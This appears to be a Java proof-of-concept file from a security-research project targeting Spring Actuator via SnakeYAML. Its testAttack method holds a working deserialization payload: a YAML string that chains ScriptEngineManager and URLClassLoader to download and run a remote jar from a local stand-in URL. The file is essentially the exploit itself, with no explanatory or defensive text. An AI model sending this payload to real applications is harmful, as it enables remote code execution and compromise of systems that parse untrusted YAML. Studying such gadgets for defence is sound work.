package com.threedr3am.bug.spring.actuator.snakeyaml;

import org.yaml.snakeyaml.Yaml;

/**
 * @author threedr3am
 */
public class SnakeYamlTest {

  public static void main(String[] args) {
    testNewInstance();
    testAttack();
  }

  public static void testNewInstance() {
    Yaml yaml = new Yaml();
    yaml.load("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [\"threedr3am\"]");
  }

  public static void testAttack() {
    Yaml yaml = new Yaml();
    yaml.load("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"]]]]");
  }

}
